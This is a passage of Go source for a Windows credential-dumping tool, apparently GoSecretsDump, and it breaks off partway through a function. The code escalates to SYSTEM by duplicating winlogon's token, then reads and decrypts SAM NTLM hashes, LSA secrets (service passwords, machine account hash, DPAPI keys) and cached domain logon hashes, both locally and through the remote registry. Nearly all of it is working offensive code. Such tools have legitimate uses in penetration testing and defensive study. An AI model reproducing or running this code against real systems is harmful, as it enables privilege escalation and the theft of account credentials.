package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/Velocidex/regparser"
	"github.com/hirochachacha/go-smb2"
	"github.com/latortuga71/GoSecretsDump/pkg/win32"
	"golang.org/x/crypto/md4"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
	"golang.org/x/text/encoding/unicode"
)

type SamSecret struct {
	Name   string
	Rid    string
	NtHash string
}

type SamSecrets struct {
	SamSecrets []SamSecret
}
type LsaSecrets struct {
	LsaSecrets map[string][]string
}

type SecretPrinter interface {
	ClassicPrint()
}

func JsonPrint(v SecretPrinter) {
	j, err := json.MarshalIndent(v, "", " ")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(j))
}

func (l *LsaSecrets) ClassicPrint() string {
	result := "[+] LSA SECRETS\n"
	for k, v := range l.LsaSecrets {
		result += fmt.Sprintf("[+] %s\n", k)
		for _, cred := range v {
			result += fmt.Sprintf("%s\n", cred)
		}
	}
	return result
}

func (s *SamSecrets) ClassicPrint() string {
	result := "[+] SAM\n"
	for _, x := range s.SamSecrets {
		result += fmt.Sprintf("%s:%s:%s\n", x.Name, x.Rid, x.NtHash)
	}
	return result
}

func EnablePriv(priv string) (string, error) {
	hProc, _, err := win32.GetCurrentProcess.Call(uintptr(win32.NullRef))
	if hProc == 0 {
		return "", err
	}
	var hToken windows.Token
	var luid windows.LUID
	err = windows.OpenProcessToken(windows.Handle(hProc), win32.TOKEN_QUERY|win32.TOKEN_ADJUST_PRIVILEGES, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.LookupPrivilegeValue(nil, syscall.StringToUTF16Ptr(priv), &luid)
	if err != nil {
		return "", err
	}
	luAttr := windows.LUIDAndAttributes{
		Luid:       luid,
		Attributes: windows.SE_PRIVILEGE_ENABLED,
	}
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges:     [1]windows.LUIDAndAttributes{},
	}
	tp.Privileges[0] = luAttr
	oldTp := windows.Tokenprivileges{}
	var retLen uint32
	err = windows.AdjustTokenPrivileges(hToken, false, &tp, uint32(unsafe.Sizeof(tp)), &oldTp, &retLen)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Enabled %s Privilege", priv), nil
}
func GetSystem() (string, error) {
	if _, err := EnablePriv("SeDebugPrivilege"); err != nil {
		return "", err
	}
	VerbosePrint("[+] Enabled SeDebugPrivilege")
	var pid uint32 = 0
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	// do
	err = windows.Process32First(hSnapshot, &pe32)
	if err != nil {
		return "", err
	}
	// while
	for {
		err = windows.Process32Next(hSnapshot, &pe32)
		if err != nil {
			break
		}
		// else do stuff with process
		name := syscall.UTF16ToString(pe32.ExeFile[:])
		if name == "winlogon.exe" || name == "OfficeClickToRun.exe" || name == "Sysmon.exe" {
			pid = pe32.ProcessID
			break
		}
	}
	if pid == 0 {
		return "", errors.New("Failed to find system process.")
	}
	VerbosePrint("[+] Found SYSTEM PROCESS")
	windows.CloseHandle(hSnapshot)
	// enable SEDebug
	hProc, err := windows.OpenProcess(win32.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, win32.TOKEN_IMPERSONATE|win32.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
	if err != nil {
		return "", err
	}
	worked, err := win32.ImpersonateLoggedOnUser(duplicatedToken)
	if !worked {
		return "", err
	}
	VerbosePrint("[+] Elevated To System.")
	return "Elevated To System.", nil
}

// only for windows 10 version 1609+
func GetAESSysKey() ([]byte, []byte, error) {
	// Add Error Handling
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", registry.ALL_ACCESS)
	if err != nil {
		return nil, nil, err
	}
	defer key.Close()
	rawF, _, err := key.GetBinaryValue("F")
	if err != nil {
		return nil, nil, err
	}
	if rawF[0] != 3 {
		return nil, nil, errors.New("RC4 Encrypted SysKey Detected. Not Supported.")
	}
	sysKey := rawF[0x88 : 0x88+16]
	sysKeyIv := rawF[0x78 : 0x78+16]
	return sysKey, sysKeyIv, nil
}

func GetAesEncyptedHash(rid string) ([]byte, []byte, []byte, error) {
	// Add Error Handling
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SAM\\SAM\\Domains\\Account\\Users\\%s", rid), registry.ALL_ACCESS)
	if err != nil {
		return nil, nil, nil, err
	}
	defer key.Close()
	rawV := make([]byte, 0)
	rawV, _, err = key.GetBinaryValue("V")
	if err != nil {
		return nil, nil, nil, err
	}
	if err != nil {
		return nil, nil, nil, err
	}
	o := binary.LittleEndian.Uint32(rawV[12:16]) + 204
	l := binary.LittleEndian.Uint32(rawV[16:20])
	userName := rawV[o : o+l]
	hashLength := rawV[0xAC]
	if hashLength == 0x14 {
		VerbosePrint(fmt.Sprintf("[-] RID %s [!] Rc4 Encrypted Hash Detected. Not Supported.", rid))
		return nil, nil, nil, errors.New("[!] Rc4 Encrypted Hash Detected. Not Supported.")
	}
	if hashLength != 0x38 {
		VerbosePrint(fmt.Sprintf("[-] RID %s has no NTLM Hash", rid))
		return nil, nil, nil, errors.New("User has no NTLM Hash")
	}
	hashOffset := binary.LittleEndian.Uint16(rawV[0xa8 : 0xa8+4]) //+ 0xCC
	ntOffSetInt := hashOffset + uint16(0xCC)
	ntRevision := rawV[ntOffSetInt+2 : ntOffSetInt+3][0]
	if ntRevision != 2 {
		return nil, nil, nil, errors.New("[!] Not AES Hash. Not Supported.")
	}
	exists := rawV[0x9C+16 : 0x9C+20][0]
	if exists != 56 {
		VerbosePrint(fmt.Sprintf("[-] RID %s has no NTLM Hash", rid))
		return nil, nil, nil, errors.New("[!] No Hash Found.")
	}
	iv := rawV[ntOffSetInt+8 : ntOffSetInt+24]
	hash := rawV[ntOffSetInt+24 : ntOffSetInt+24+56][:16]
	return hash, iv, userName, nil
}

type KeyInfo struct {
	Class           *uint16
	Classlen        uint32
	SaLen           uint32
	MaxClassLen     uint32
	SubKeyCount     uint32
	MaxSubKeyLen    uint32 // size of the key's subkey with the longest name, in Unicode characters, not including the terminating zero byte
	ValueCount      uint32
	MaxValueNameLen uint32 // size of the key's longest value name, in Unicode characters, not including the terminating zero byte
	MaxValueLen     uint32 // longest data component among the key's values, in bytes
	lastWriteTime   syscall.Filetime
}

func GetBootKeyRemote(host string) ([]byte, error) {
	tmpKey := ""
	bootKey := make([]byte, 0)
	keysToGet := []string{"JD", "Skew1", "GBG", "Data"}
	k, err := registry.OpenRemoteKey(host, registry.LOCAL_MACHINE)
	if err != nil {
		return nil, err
	}
	defer k.Close()
	for _, key := range keysToGet {
		key, err := registry.OpenKey(k, fmt.Sprintf("SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", key), windows.MAXIMUM_ALLOWED)
		if err != nil {
			return nil, err
		}
		defer key.Close()
		classDataSize := uint32(20)
		classData := make([]uint16, classDataSize)
		ki := KeyInfo{Class: &classData[0], Classlen: classDataSize}
		err = syscall.RegQueryInfoKey(syscall.Handle(key), ki.Class, &ki.Classlen, nil, &ki.SubKeyCount, &ki.MaxSubKeyLen, &ki.MaxClassLen, &ki.ValueCount, &ki.MaxValueNameLen, &ki.MaxValueLen, &ki.SaLen, &ki.lastWriteTime)
		if err != nil {
			return nil, err
		}
		tmpkeyChunk := []byte(syscall.UTF16ToString(classData))
		tmpKey += string(tmpkeyChunk)
	}
	if len(tmpKey) > 32 {
		// https://github.com/C-Sto/gosecretsdump/blob/master/pkg/systemreader/systemreader.go
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		tmpKey, _ = ud.String(tmpKey)
	}
	transforms := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}
	unhexedKey, err := hex.DecodeString(tmpKey)
	if err != nil {
		return nil, err
	}
	for i := 0; i < len(unhexedKey); i++ {
		bootKey = append(bootKey, unhexedKey[transforms[i]])
	}
	return bootKey, nil
}

func GetBootKey() ([]byte, error) {
	tmpKey := ""
	bootKey := make([]byte, 0)
	keysToGet := []string{"JD", "Skew1", "GBG", "Data"}
	for _, key := range keysToGet {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", key), registry.ALL_ACCESS)
		if err != nil {
			return nil, err
		}
		defer key.Close()
		classDataSize := uint32(20)
		classData := make([]uint16, classDataSize)
		ki := KeyInfo{Class: &classData[0], Classlen: classDataSize}
		err = syscall.RegQueryInfoKey(syscall.Handle(key), ki.Class, &ki.Classlen, nil, &ki.SubKeyCount, &ki.MaxSubKeyLen, &ki.MaxClassLen, &ki.ValueCount, &ki.MaxValueNameLen, &ki.MaxValueLen, &ki.SaLen, &ki.lastWriteTime)
		if err != nil {
			return nil, err
		}
		tmpkeyChunk := []byte(syscall.UTF16ToString(classData))
		tmpKey += string(tmpkeyChunk)
	}
	if len(tmpKey) > 32 {
		// https://github.com/C-Sto/gosecretsdump/blob/master/pkg/systemreader/systemreader.go
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		tmpKey, _ = ud.String(tmpKey)
	}
	transforms := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}
	unhexedKey, err := hex.DecodeString(tmpKey)
	if err != nil {
		return nil, err
	}
	for i := 0; i < len(unhexedKey); i++ {
		bootKey = append(bootKey, unhexedKey[transforms[i]])
	}
	return bootKey, nil
}

func DecryptAES(key, value, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	thing := cipher.NewCBCDecrypter(block, iv)
	dst := make([]byte, len(value))
	thing.CryptBlocks(dst, value)
	return dst, nil
}

func DecryptDES(key, value []byte) []byte {
	c, err := des.NewCipher(key)
	if err != nil {
		log.Fatal(err)
	}
	decrypted := make([]byte, 8)
	c.Decrypt(decrypted, value)
	return decrypted
}

func DecryptSysKey(bootKey, sysKey, sysKeyIV []byte) ([]byte, error) {
	decrypytedSysKey, err := DecryptAES(bootKey, sysKey, sysKeyIV)
	if err != nil {
		return nil, err
	}
	return decrypytedSysKey, err
}

func DecryptedNtlmHashPartOne(sysKey, encryptedHash, encryptedHashIv []byte) ([]byte, []byte) {
	decryptedHash, err := DecryptAES(sysKey, encryptedHash, encryptedHashIv)
	if err != nil {
		return nil, nil
	}
	return decryptedHash[:8], decryptedHash[8:16]
}

func DecryptedNtlmHashPartTwo(encryptedNTLMHash1, encryptedNTLMHash2 []byte, rid string) (string, error) {
	// converting RID to int then little endian.
	r := make([]byte, 4)
	p, err := strconv.ParseUint(rid, 16, 32)
	if err != nil {
		return "", err
	}
	// needs to be little endian
	binary.LittleEndian.PutUint32(r, uint32(p))
	// get des keys
	desKey1 := make([]byte, 0)
	desKey2 := make([]byte, 0)
	desKey1 = append(desKey1, r[0])
	desKey1 = append(desKey1, r[1])
	desKey1 = append(desKey1, r[2])
	desKey1 = append(desKey1, r[3])
	desKey1 = append(desKey1, r[0])
	desKey1 = append(desKey1, r[1])
	desKey1 = append(desKey1, r[2])
	desKey2 = append(desKey2, r[3])
	desKey2 = append(desKey2, r[0])
	desKey2 = append(desKey2, r[1])
	desKey2 = append(desKey2, r[2])
	desKey2 = append(desKey2, r[3])
	desKey2 = append(desKey2, r[0])
	desKey2 = append(desKey2, r[1])
	// convert above des keys from 7 bytes to 8 bytes.
	des1 := strToKey(desKey1)
	des2 := strToKey(desKey2)

	deskey1, err := hex.DecodeString(hex.EncodeToString(des1[:]))
	deskey2, err := hex.DecodeString(hex.EncodeToString(des2[:]))
	ntlm1, err := hex.DecodeString(hex.EncodeToString(encryptedNTLMHash1))
	ntlm2, err := hex.DecodeString(hex.EncodeToString(encryptedNTLMHash2))
	hash := fmt.Sprintf("%s%s", hex.EncodeToString(DecryptDES(deskey1, ntlm1)), hex.EncodeToString(DecryptDES(deskey2, ntlm2)))
	return hash, nil
}

func strToKey(s []byte) [8]byte {
	key := make([]byte, 0)
	key = append(key, s[0]>>1)
	key = append(key, ((s[0]&0x01)<<6)|s[1]>>2)
	key = append(key, ((s[1]&0x03)<<5)|s[2]>>3)
	key = append(key, ((s[2]&0x07)<<4)|s[3]>>4)
	key = append(key, ((s[3]&0x0F)<<3)|s[4]>>5)
	key = append(key, ((s[4]&0x01F)<<2)|s[5]>>6)
	key = append(key, ((s[5]&0x3F)<<1)|s[6]>>7)
	key = append(key, s[6]&0x7F)
	for x := 0; x < 8; x++ {
		key[x] = (key[x] << 1)
		key[x] = byte(oddParity[int(key[x])])
	}
	var data [8]byte
	for x := range key {
		data[x] = key[x]
	}
	return data
}

var oddParity = []int{
	1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
	16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
	32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
	49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
	64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
	81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
	97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110,
	112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127,
	128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143,
	145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158,
	161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174,
	176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191,
	193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206,
	208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223,
	224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239,
	241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254,
}

func GetRids() ([]string, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SAM\\SAM\\Domains\\Account\\Users"), registry.ALL_ACCESS)
	if err != nil {
		return nil, err
	}
	rids, err := key.ReadSubKeyNames(0)
	if err != nil {
		return nil, err
	}
	return rids, nil
}

func DumpHashRemote(samEntry RidAndSecrets, sysKey []byte) (*SamSecret, error) {
	firstHalf, secondHalf := DecryptedNtlmHashPartOne(sysKey, samEntry.Hash, samEntry.Iv)
	if firstHalf == nil || secondHalf == nil {
		return nil, errors.New("Failed To Decrypt NTLM HASHES")
	}
	hash, err := DecryptedNtlmHashPartTwo(firstHalf, secondHalf, samEntry.Rid)
	if err != nil {
		return nil, err
	}
	ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
	name, err := ud.String(string(samEntry.UserName))
	if err != nil {
		return nil, err
	}
	p, err := strconv.ParseUint(samEntry.Rid, 16, 32)
	if err != nil {
		return nil, err
	}
	ridStr := strconv.Itoa(int(p))
	return &SamSecret{
		Name:   name,
		Rid:    ridStr,
		NtHash: hash,
	}, nil
}

func DumpHash(rid string, sysKey []byte) (*SamSecret, error) {
	encryptedHash, encryptedHashIv, userName, err := GetAesEncyptedHash(rid)
	if err != nil {
		return nil, err
	}
	firstHalf, secondHalf := DecryptedNtlmHashPartOne(sysKey, encryptedHash, encryptedHashIv)
	if firstHalf == nil || secondHalf == nil {
		return nil, errors.New("Failed To Decrypt NTLM HASHES")
	}
	hash, err := DecryptedNtlmHashPartTwo(firstHalf, secondHalf, rid)
	if err != nil {
		return nil, err
	}
	ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
	name, err := ud.String(string(userName))
	if err != nil {
		return nil, err
	}
	p, err := strconv.ParseUint(rid, 16, 32)
	if err != nil {
		return nil, err
	}
	ridStr := strconv.Itoa(int(p))
	return &SamSecret{
		Name:   name,
		Rid:    ridStr,
		NtHash: hash,
	}, nil
}

func DecryptAESLSA(secret, bootkey []byte) []byte {
	tmpKey := make([]byte, 0)
	tmpDecrypted := make([]byte, 16)
	decrypted := make([]byte, 0)
	iv := make([]byte, 16)
	for y := 0; y < 16; y++ {
		iv[y] = 0x00
	}
	tmpKey = append(tmpKey, bootkey...)
	for x := 1; x < 1000+1; x++ {
		tmpKey = append(tmpKey, secret[28:60]...)
	}
	aesKey := sha256.Sum256(tmpKey)
	for x := 60; x < len(secret); x += 16 {
		c, err := aes.NewCipher(aesKey[:])
		if err != nil {
			log.Fatal(err)
		}
		thing := cipher.NewCBCDecrypter(c, iv)
		tmpbuf := secret[x : x+16]
		if len(tmpbuf) < 16 {
			diff := (16 - len(tmpbuf))
			var padding []byte
			for n := 0; n < diff; n++ {
				padding = append(padding, 0x00)
			}
			tmpbuf = append(tmpbuf, padding...)
		}
		// decrypt and append
		thing.CryptBlocks(tmpDecrypted, tmpbuf)
		decrypted = append(decrypted, tmpDecrypted...)
	}
	return decrypted[68:100]
}

func GetLSAKeyRemote(bootKey []byte, rawSecurityHive []byte) ([]byte, error) {
	reader := bytes.NewReader(rawSecurityHive)
	var data []byte = nil
	reg, err := regparser.NewRegistry(reader)
	if err != nil {
		return nil, err
	}
	key := reg.OpenKey("Policy\\PolEKList")
	if key == nil {
		return nil, errors.New("Reg path not found.")
	}
	for _, v := range key.Values() {
		if v.ValueName() == "" {
			data = v.ValueData().Data
			break
		}
	}
	lsaKey := DecryptAESLSA(data, bootKey)
	return lsaKey, nil
}

func GetLSAKey(bootKey []byte) ([]byte, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", registry.ALL_ACCESS)
	if err != nil {
		return nil, err
	}
	data := make([]byte, 0)
	n, _, err := key.GetValue("", data)
	if err != nil {
		return nil, err
	}
	data = make([]byte, n)
	n, _, err = key.GetValue("", data)
	if err != nil {
		return nil, err
	}
	lsaKey := DecryptAESLSA(data, bootKey)
	return lsaKey, nil
}

type LSASecretBlob struct {
	Length uint16
	Unk    []byte
	Secret []byte
}

type LSASecret struct {
	Version  []byte
	EncKeyID []byte
	EncAlgo  []byte
	Flags    []byte
	Data     []byte
}

func DecryptAESECB(secret, key []byte) []byte {
	decrypted := make([]byte, len(secret))
	size := 16
	cipher, _ := aes.NewCipher(key)
	for bs, be := 0, size; bs < len(secret); bs, be = bs+size, be+size {
		cipher.Decrypt(decrypted[bs:be], secret[bs:be])
	}
	return decrypted

}

func ExtractLsaSecret(keyName string, blob *LSASecretBlob) (string, error) {
	if strings.HasPrefix(keyName, "_SC_") {
		var serviceName string
		var s *uint16
		h, err := windows.OpenSCManager(s, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
		if err != nil {
			return "", errors.New("Failed to open service manager")
		}
		svcMgr := &mgr.Mgr{}
		svcMgr.Handle = h
		name := syscall.StringToUTF16Ptr(keyName[4:])
		h, err = windows.OpenService(svcMgr.Handle, name, windows.SERVICE_QUERY_CONFIG|windows.SC_MANAGER_ENUMERATE_SERVICE)
		serv := &mgr.Service{}
		serv.Handle = h
		serv.Name = keyName[4:]
		serviceConfig, err := serv.Config()
		if err != nil {
			serv.Close()
			return "", errors.New("Failed to get service name")

		}
		serviceName = serviceConfig.ServiceStartName
		serv.Close()
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		plainText, _ := ud.String(string(blob.Secret))
		return fmt.Sprintf("%s:%s", serviceName, plainText), nil

	}
	if strings.HasPrefix(strings.ToUpper(keyName), "$MACHINE.ACC") {
		host, err := os.Hostname()
		var domain string
		if err != nil {
			host = "."
		}
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`, registry.ALL_ACCESS)
		if err != nil {
			domain = "??"
		}
		domain, _, err = k.GetStringValue("Domain")
		if err != nil {
			domain = ""
		}
		h := md4.New()
		h.Write(blob.Secret)
		return fmt.Sprintf("%s\\%s$:aad3b435b51404eeaad3b435b51404ee:%s", domain, host, hex.EncodeToString(h.Sum(nil))), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "DPAPI") {
		h1 := fmt.Sprintf("dpapiMachine key: %s\n", hex.EncodeToString(blob.Secret[4:24]))
		h2 := fmt.Sprintf("dpapiUser key: %s", hex.EncodeToString(blob.Secret[24:44]))
		return fmt.Sprintf("%s%s", h1, h2), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "NL$KM") {
		return fmt.Sprintf("NL$KM:%s", hex.EncodeToString(blob.Secret)), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "ASPNET_WP_PASSWORD") {
		return fmt.Sprintln("ASP.net"), nil
	}
	return fmt.Sprintf("Unsupported Secret %s", hex.EncodeToString(blob.Secret)), nil
}

func ExtractLsaSecretRemote(keyName string, blob *LSASecretBlob, host, domain string) (string, error) {
	if strings.HasPrefix(keyName, "_SC_") {
		VerbosePrint("[+] HIT SERVICE ACC")
		var serviceName string
		s := windows.StringToUTF16Ptr(host)
		h, err := windows.OpenSCManager(s, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
		if err != nil {
			return "", errors.New("Failed to open service manager")
		}
		VerbosePrint("[+] Got Past OpenService")
		svcMgr := &mgr.Mgr{}
		svcMgr.Handle = h
		name := syscall.StringToUTF16Ptr(keyName[4:])
		h, err = windows.OpenService(svcMgr.Handle, name, windows.SERVICE_QUERY_CONFIG|windows.SC_MANAGER_ENUMERATE_SERVICE)
		serv := &mgr.Service{}
		serv.Handle = h
		serv.Name = keyName[4:]
		serviceConfig, err := serv.Config()
		if err != nil {
			serv.Close()
			return "", errors.New("Failed to get service name")

		}
		serviceName = serviceConfig.ServiceStartName
		serv.Close()
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		plainText, _ := ud.String(string(blob.Secret))
		return fmt.Sprintf("%s:%s", serviceName, plainText), nil

	}
	if strings.HasPrefix(strings.ToUpper(keyName), "$MACHINE.ACC") {
		h := md4.New()
		h.Write(blob.Secret)
		return fmt.Sprintf("%s\\%s$:aad3b435b51404eeaad3b435b51404ee:%s", domain, host, hex.EncodeToString(h.Sum(nil))), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "DPAPI") {
		h1 := fmt.Sprintf("dpapiMachine key: %s\n", hex.EncodeToString(blob.Secret[4:24]))
		h2 := fmt.Sprintf("dpapiUser key: %s", hex.EncodeToString(blob.Secret[24:44]))
		return fmt.Sprintf("%s%s", h1, h2), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "NL$KM") {
		return fmt.Sprintf("NL$KM:%s", hex.EncodeToString(blob.Secret)), nil
	}
	if strings.HasPrefix(strings.ToUpper(keyName), "ASPNET_WP_PASSWORD") {
		return fmt.Sprintln("ASP.net"), nil
	}
	return fmt.Sprintf("Unsupported Secret %s", hex.EncodeToString(blob.Secret)), nil
}

func DumpSecret(registryKey string, lsaKey []byte) []byte {
	secKey, err := registry.OpenKey(registry.LOCAL_MACHINE, registryKey, registry.ALL_ACCESS)
	if err != nil {
		secKey.Close()
		return nil
	}
	defer secKey.Close()
	data := make([]byte, 0)
	n, _, err := secKey.GetValue("", data)
	if err != nil {
		secKey.Close()
		return nil
	}
	data = make([]byte, n)
	n, _, err = secKey.GetValue("", data)
	if err != nil {
		secKey.Close()
		return nil
	}
	secret := &LSASecret{
		Version:  data[:4],
		EncKeyID: data[4:20],
		EncAlgo:  data[20:24],
		Flags:    data[24:28],
		Data:     data[28:],
	}
	tmpKey := ComputeSha256(lsaKey, secret.Data[:32])
	val2 := secret.Data[32:]
	plainText := DecryptAESECB(val2, tmpKey)
	return plainText
}

func GetNLKMSecret(lsaKey []byte) (string, []byte) {
	key := "SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal"
	plainText := DumpSecret(key, lsaKey)
	if plainText == nil {
		return "", nil
	}
	secretLen := binary.LittleEndian.Uint16(plainText[:4])
	secretBlob := &LSASecretBlob{
		Length: secretLen,
		Unk:    plainText[4:16],
		Secret: plainText[16 : secretLen+16],
	}
	secret, err := ExtractLsaSecret("NL$KM", secretBlob)
	if err != nil {
		return "", nil
	}
	return secret, plainText
}

type NLRecord struct {
	UserLength       int
	DomainNameLength int
	DnsDomainLength  int
	IV               []byte
	EncryptedData    []byte
}

type CachedCredentials struct {
	UserName   string
	Domain     string
	Credential string
}

type CachedDomainCredentials struct {
	Credentials []*CachedCredentials
}

func Pad(data int) int {
	if data&0x3 == 0 {
		return data + (data & 0x03)
	}
	return data
}

func GeneratePadding(amount int) []byte {
	padding := make([]byte, amount)
	for x := 0; x < amount; x++ {
		padding = append(padding, 0x00)
	}
	return padding
}

func GetCachedDomainCredentials(nlkmKey []byte) (*CachedDomainCredentials, error) {
	Credentials := &CachedDomainCredentials{
		Credentials: make([]*CachedCredentials, 0),
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Cache", registry.ALL_ACCESS)
	if err != nil {
		return nil, err
	}
	values, err := k.ReadValueNames(0)
	if err != nil {
		return nil, err
	}
	for _, v := range values {
		if v == "NL$CONTROL" {
			continue
		}
		data, _, err := k.GetBinaryValue(v)
		if err != nil {
			continue
		}
		if data == nil {
			continue
		}
		if len(data) < 96 {
			continue
		}
		cachedUser := NLRecord{
			UserLength:       int(binary.LittleEndian.Uint16(data[:2])),
			DomainNameLength: int(binary.LittleEndian.Uint16(data[2:4])),
			DnsDomainLength:  int(binary.LittleEndian.Uint16(data[60:62])),
			IV:               data[64:80],
			EncryptedData:    data[96:],
		}
		if cachedUser.UserLength == 0 {
			continue
		}
		block, err := aes.NewCipher(nlkmKey[16:32])
		if err != nil {
			continue
		}
		thing := cipher.NewCBCDecrypter(block, cachedUser.IV)
		leftOver := len(cachedUser.EncryptedData) % 16
		if leftOver != 0 {
			padding := make([]byte, 0)
			for i := 16 - leftOver; i > 0; i-- {
				padding = append(padding, 0x00)
			}
			concat := make([]byte, len(cachedUser.EncryptedData)+len(padding))
			concat = append(concat, cachedUser.EncryptedData...)
			concat = append(concat, padding...)
			cachedUser.EncryptedData = concat
		}
		plainText := make([]byte, len(cachedUser.EncryptedData))
		thing.CryptBlocks(plainText, cachedUser.EncryptedData)
		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
		unameOffset := 72
		pad := 2 * ((cachedUser.UserLength / 2) % 2)
		domainOffset := unameOffset + cachedUser.UserLength + pad
		pad = 2 * ((cachedUser.DomainNameLength / 2) % 2)
		domainNameOffset := domainOffset + cachedUser.DomainNameLength + pad
		hashedPw := plainText[:0x10]
		userName, err := ud.String(string(plainText[unameOffset : unameOffset+cachedUser.UserLength]))
		domain, err := ud.String(string(plainText[domainOffset : domainOffset+cachedUser.DomainNameLength]))
		domain = strings.ReplaceAll(domain, `\0`, "")
		domainName, err := ud.String(string(plainText[domainNameOffset : domainNameOffset+cachedUser.DnsDomainLength]))
		if err != nil {
			return nil, err
		}
		cred := fmt.Sprintf("%s/%s:$DCC2$10240#%s#%s", domain, userName, userName, hex.EncodeToString(hashedPw))
		c := &CachedCredentials{
			UserName:   userName,
			Domain:     domain + domainName,
			Credential: cred,
		}
		Credentials.Credentials = append(Credentials.Credentials, c)
	}
	return Credentials, nil
}

func GetSysKey() ([]byte, error) {
	encryptedSysKey, encryptedSysKeyIv, err := GetAESSysKey()
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got AES Encrypted SYSKEY")
	bootKey, err := GetBootKey()
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got BOOTKEY")
	sysKey, err := DecryptSysKey(bootKey, encryptedSysKey, encryptedSysKeyIv)
	if err != nil {
		return nil, err
	}
	VerbosePrint("[+] Got DECRYPTED SYSKEY")
	return sysKey, nil
}

func GetLSASecrets(lsaKey []byte) (*LsaSecrets, error) {
	secretsMap := &LsaSecrets{}
	secretsMap.LsaSecrets = make(map[string][]string, 0)
	NLKMSecretString, NLKMSecretBlob := GetNLKMSecret(lsaKey)
	if NLKMSecretString != "" {
		secretsMap.LsaSecrets["NL$KM"] = append(secretsMap.LsaSecrets["NL$KM"], NLKMSecretString)
		cached, err := GetCachedDomainCredentials(NLKMSecretBlob)
		if err != nil {
			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], "NULL")
		}
		for _, c := range cached.Credentials {
			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], c.Credential)
		}
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", registry.ALL_ACCESS)
	if err != nil {
		return nil, err
	}
	defer k.Close()
	subkeys, err := k.ReadSubKeyNames(0)
